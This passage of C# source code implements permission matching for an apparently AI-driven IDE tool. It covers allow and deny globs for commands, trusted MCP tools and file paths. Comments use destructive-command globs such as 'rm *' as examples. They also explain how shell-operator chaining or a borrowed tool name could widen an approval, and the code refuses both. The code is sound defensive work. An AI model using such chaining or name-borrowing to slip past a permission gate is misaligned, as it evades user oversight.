            return new PermissionDecision(allow ? "allow" : "reject");
        }

        // Returns the exact text the first matching always-prompt pattern matched (so the banner can call
        // it out in red), or null when nothing matches. The matched span — not the pattern — is returned,
        // so a wildcard glob (e.g. "rm *") yields the actual command text it covered.
        private static string? MatchFragment(Regex[] patterns, string text)
        {
            foreach (var p in patterns)
            {
                var m = p.Match(text);
                if (m.Success)
                    return m.Value;
            }
            return null;
        }

        // Anchored command globs only ever match a command; a request with no command (an edit, a
        // read) can never satisfy the deny list.
        private static bool MatchesCommand(IEnumerable<Regex> patterns, string? command) =>
            command is not null && patterns.Any(p => p.IsMatch(command));

        // The allow-side twin, with the shell-operator refusal (pre-release security review, September 2026): a WILDCARD rule
        // that matches a line carrying an operator does not grant, and says so through
        // <paramref name="note"/> for the banner. An exact rule grants whatever it matches - it
        // already names the whole line the user approved. Rules are tried in order and the first
        // exact match wins outright, so a withheld wildcard never shadows an exact rule behind it.
        private bool MatchesAllowCommand(IEnumerable<CommandRule> rules, string? command, ref string? note)
        {
            if (command is null)
                return false;

            foreach (var rule in rules)
            {
                if (!rule.Regex.IsMatch(command))
                    continue;
                if (!rule.Wildcard)
                    return true;

                if (ShellOperators.Find(command) is { } op)
                {
                    _log?.Invoke($"[permission] rule withheld: \"{rule.Glob}\" matches but the command contains {op}");
                    note ??= ShellOperators.WithheldSentence(rule.Glob, op);
                    continue;
                }

                return true;
            }

            return false;
        }

        // One compiled allow-side command rule: the glob as the user wrote it (for the note), its
        // regex, and whether it has a wildcard once escapes are read - which is what decides whether
        // the operator refusal applies to it.
        private sealed class CommandRule
        {
            private CommandRule(string glob, Regex regex, bool wildcard)
            {
                Glob = glob;
                Regex = regex;
                Wildcard = wildcard;
            }

            public string Glob { get; }
            public Regex Regex { get; }
            public bool Wildcard { get; }

            public static CommandRule From(string glob) =>
                new(glob.Trim(), PermissionGlob.ToRegex(glob, anchored: true), PermissionGlob.HasWildcard(glob));
        }

        // A trusted-tool match. The request's tool name is namespaced and spelled differently per
        // backend, so it is unwrapped first — which is also what anchors the match on OUR server, so a
        // third-party tool sharing a name with one of ours can never satisfy a rule.
        // <paramref name="fromConfig"/> distinguishes a permanent rule from a session grant, for the log.
        private bool MatchesTool(PermissionRequest request, out bool fromConfig)
        {
            fromConfig = false;
            // A shell command has no trusted name (TrustedToolName): a persisted rule for one of our
            // tools must not approve a command whose title borrows that tool's name.
            if (TrustedToolName(request) is not { } toolName)
                return false;

            // Each rule is asked whether it names this tool: the rule builds both backend spellings
            // from its own halves, so the incoming name is never parsed and an unknown server's
            // ambiguous split can't widen a rule onto a tool it doesn't name. Same test for ours and
            // anyone else's — the server is in the rule either way.
            foreach (var rule in _allowTools)
                if (IdeMcpServer.NamesSameTool(rule, toolName))
                {
                    fromConfig = true;
                    return true;
                }

            foreach (var rule in _sessionAllowTools.Keys)
                if (IdeMcpServer.NamesSameTool(rule, toolName))
                    return true;

            return false;
        }

        // Anchored path globs only ever match a file-scoped request's path; commands and MCP tool
        // requests carry no Path so they can never satisfy a path rule. Slash direction is normalized
        // on both sides (globs at compile time), so "src/foo" rules match "src\foo" subjects.
        private static bool MatchesPath(IEnumerable<Regex> patterns, string? path)
        {
            if (path is null)
                return false;
            var normalized = NormalizeSlashes(path);
            return patterns.Any(p => p.IsMatch(normalized));
        }

        private static string NormalizeSlashes(string s) => s.Replace('/', '\\');

        /// <param name="map">
        /// Applied to each glob AFTER the null/blank filter, never before it. Every caller's input is a
        /// config array the user can hand-edit, so an element can be null — and a transform hoisted out
        /// in front of the filter turns the entry this method is meant to skip into an exception in the
        /// caller's constructor.
        /// </param>
        private static Regex[] Compile(IEnumerable<string>? globs, bool anchored, Func<string, string>? map = null) =>
            (globs ?? Enumerable.Empty<string>())
                .Where(g => !string.IsNullOrWhiteSpace(g))
                .Select(g => GlobToRegex(map is null ? g : map(g), anchored))
                .ToArray();

        // Translate a shell-ish glob ("git push *", "rm *") to a case-insensitive regex - the ONE glob
        // grammar, Core.PermissionGlob, which the banner also writes in (pre-release security review: the
        // seeded pattern escapes the command's own wildcards, and this is what reads the escape back).
        // When <paramref name="anchored"/>, the pattern must match the whole string (^…$) so a
        // wildcard-free glob means an *exact* command — an allow rule "dotnet build" grants only
        // "dotnet build", not any string that merely contains it. Unanchored globs match as a
        // substring anywhere (the aggressive deny-list behaviour).
        private static Regex GlobToRegex(string glob, bool anchored) => PermissionGlob.ToRegex(glob, anchored);
    }
}
